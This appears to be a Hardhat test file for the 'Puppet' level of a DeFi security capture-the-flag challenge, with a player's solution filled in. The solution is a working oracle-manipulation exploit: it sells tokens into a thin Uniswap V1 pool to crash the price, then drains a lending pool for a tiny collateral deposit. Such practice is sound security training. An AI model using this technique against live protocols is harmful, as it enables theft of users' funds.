const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(
  tokensSold,
  tokensInReserve,
  etherInReserve
) {
  return (
    (tokensSold * 997n * etherInReserve) /
    (tokensInReserve * 1000n + tokensSold * 997n)
  );
}

describe("[Challenge] Puppet", function () {
  let deployer, player;
  let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

  const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
  const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

  const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

  const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    const UniswapExchangeFactory = new ethers.ContractFactory(
      exchangeJson.abi,
      exchangeJson.evm.bytecode,
      deployer
    );
    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.evm.bytecode,
      deployer
    );

    setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Deploy token to be traded in Uniswap
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy a exchange that will be used as the factory template
    exchangeTemplate = await UniswapExchangeFactory.deploy();

    // Deploy factory, initializing it with the address of the template exchange
    uniswapFactory = await UniswapFactoryFactory.deploy();
    await uniswapFactory.initializeFactory(exchangeTemplate.address);

    // Create a new exchange for the token, and retrieve the deployed exchange's address
    let tx = await uniswapFactory.createExchange(token.address, {
      gasLimit: 1e6,
    });
    const { events } = await tx.wait();
    uniswapExchange = await UniswapExchangeFactory.attach(
      events[0].args.exchange
    );

    // Deploy the lending pool
    lendingPool = await (
      await ethers.getContractFactory("PuppetPool", deployer)
    ).deploy(token.address, uniswapExchange.address);

    // Add initial token and ETH liquidity to the pool
    await token.approve(uniswapExchange.address, UNISWAP_INITIAL_TOKEN_RESERVE);
    await uniswapExchange.addLiquidity(
      0, // min_liquidity
      UNISWAP_INITIAL_TOKEN_RESERVE,
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
    );

    // Ensure Uniswap exchange is working as expected
    expect(
      await uniswapExchange.getTokenToEthInputPrice(10n ** 18n, {
        gasLimit: 1e6,
      })
    ).to.be.eq(
      calculateTokenToEthInputPrice(
        10n ** 18n,
        UNISWAP_INITIAL_TOKEN_RESERVE,
        UNISWAP_INITIAL_ETH_RESERVE
      )
    );

    // Setup initial token balances of pool and player accounts
    await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

    // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
    expect(await lendingPool.calculateDepositRequired(10n ** 18n)).to.be.eq(
      2n * 10n ** 18n
    );

    expect(
      await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
    ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
    expect(
      await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
    ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
  });

  it("Execution", async function () {
    // /** CODE YOUR EXPLOIT HERE
    //  * I think that the right course here would be lowering the price
    //  * by interacting directly with the Uniswap contract. Particularly by
    //  * adding more tokens as liquidity, and then depositing enough wei to
    //  * be able to withraw as much as tokens as I can, hoping this would empty
    //  * the PP.
    //  *
    //  * Note: I sill don't know why I can't immediately addLiquidity.
    //  *
    //  *
    //  */

    async function deadline() {
      return (await ethers.provider.getBlock("latest")).timestamp * 2;
    }

    let parseEther = ethers.utils.parseEther;
    let formatEther = ethers.utils.formatEther;
    let getBalance = ethers.provider.getBalance;
    lendingPool = await lendingPool.connect(player);
    uniswapExchange = await uniswapExchange.connect(player);
    token = await token.connect(player);

    // async function info() {
    //   msg = "";
    //   deposit = await lendingPool.calculateDepositRequired(parseEther("1"));
    //   deposit = formatEther(deposit);
    //   msg = msg.concat(`Required to deposit ${deposit}, for 1 DVT\n\n`);

    //   // ETH balances
    //   poolBal = formatEther(await getBalance(lendingPool.address));
    //   uniBal = formatEther(await getBalance(uniswapExchange.address));
    //   atkrBal = formatEther(await getBalance(player.address));
    //   msg = msg.concat(`ETH balances:\n`)
    //   msg = msg.concat(`\tPuppetPool: ${poolBal} | UniSwap: ${uniBal} | Attacker: ${atkrBal}\n\n`);

    //   //DVT balances
    //   poolTs = formatEther(await token.balanceOf(lendingPool.address));
    //   uniTs = formatEther(await token.balanceOf(uniswapExchange.address));
    //   atkrTs = formatEther(await token.balanceOf(player.address));
    //   msg = msg.concat(`DamnVulnerableTokens balances:\n`);
    //   msg = msg.concat(`\tPuppetPool: ${poolTs} | UniSwap: ${uniTs} | Attacker: ${atkrTs}\n\n`);

    //   //Other values, such as Liquidity tokens, and deposited amount on lendingpool
    //   atkrLPs = formatEther(await uniswapExchange.balanceOf(player.address, {gasLimit: 1e6}));
    //   atkrDepos = formatEther(await lendingPool.deposits(player.address));
    //   msg = msg.concat(`Attacker additional info:\n`)
    //   msg = msg.concat(`LP tokens: ${atkrLPs}. PuppetPool deposits: ${atkrDepos} \n\n`)

    //   console.log(msg);
    // }

    // Let's create shorter variables for readability.
    // let initialEthBalance = PLAYER_INITIAL_ETH_BALANCE;
    let tokensToSell = PLAYER_INITIAL_TOKEN_BALANCE;
    let tokensToHack = POOL_INITIAL_TOKEN_BALANCE;

    async function canWeGetThemYet() {
      deposit = await lendingPool.calculateDepositRequired(tokensToHack);
      deposit = formatEther(deposit);
      console.log(`Required to deposit ${deposit} ETH, to get 100k DVTs\n\n`);
      return deposit;
    }

    await canWeGetThemYet();
    // If we want to sell all our tokens, how much ETH would we get?
    tokenPrice = await uniswapExchange.getTokenToEthInputPrice(tokensToSell, {
      gasLimit: 1e6,
    });
    console.log(
      `You get ${formatEther(tokenPrice)} ETH for ${formatEther(
        tokensToSell
      )} DVTs.`
    );

    // Ok, so let's approve UniSwap to manage our tokens
    await token.approve(uniswapExchange.address, tokensToSell);

    // Let's exchange them, and we won't conform for less
    // In a real case scenario, tokenPrice could be a little lower.
    await uniswapExchange.tokenToEthSwapInput(
      tokensToSell,
      tokenPrice,
      deadline(),
      {
        gasLimit: 1e6,
      }
    );

    await canWeGetThemYet();
    deposit = await lendingPool.calculateDepositRequired(tokensToHack);

    // Let's get all the tokens from the pool
    await lendingPool.borrow(tokensToHack, player.address, { value: deposit });

    // Since it is expected that we get more than the pool's initial token balance.
    // We have to swap our ether for some of the tokens we already deposited.

    currentEth = await getBalance(player.address);
    tokensToBuy = await uniswapExchange.getEthToTokenInputPrice(currentEth, {
      gasLimit: 1e6,
    });

    // // Now I want the cost in ETH if I were to buy 1k tokens.
    etherNeeded = await uniswapExchange.getEthToTokenOutputPrice(
      parseEther("1000"),
      {
        gasLimit: 1e6,
      }
    );

    console.log(`Your current balance is ${formatEther(currentEth)} ETH.`);
    console.log(
      `With that, you can afford to buy ${formatEther(tokensToBuy)} DVTs.`
    );
    console.log(
      `You will need ${formatEther(etherNeeded)} ETH to buy 1000 DVTs.`
    );

    // // I want my 1k tokens back.
    await uniswapExchange.ethToTokenSwapInput(parseEther("1000"), deadline(), {
      value: etherNeeded,
      gasLimit: 1e6,
    });

    currentTokens = await token.balanceOf(player.address);
    currentEth = await getBalance(player.address);
    console.log(
      `Your current balance is ${formatEther(currentEth)} ETH and ${formatEther(
        currentTokens
      )}.`
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Player executed a single transaction
    expect(
      await ethers.provider.getTransactionCount(player.address),
      "Player executed this in more than 1 transaction"
    ).to.eq(1);
    
    // Player has taken all tokens from the pool
    expect(await token.balanceOf(lendingPool.address)).to.be.eq(
      0,
      "Pool still has tokens"
    );

    expect(await token.balanceOf(player.address)).to.be.gte(
      POOL_INITIAL_TOKEN_BALANCE,
      "Not enough token balance in player"
    );
  });
});
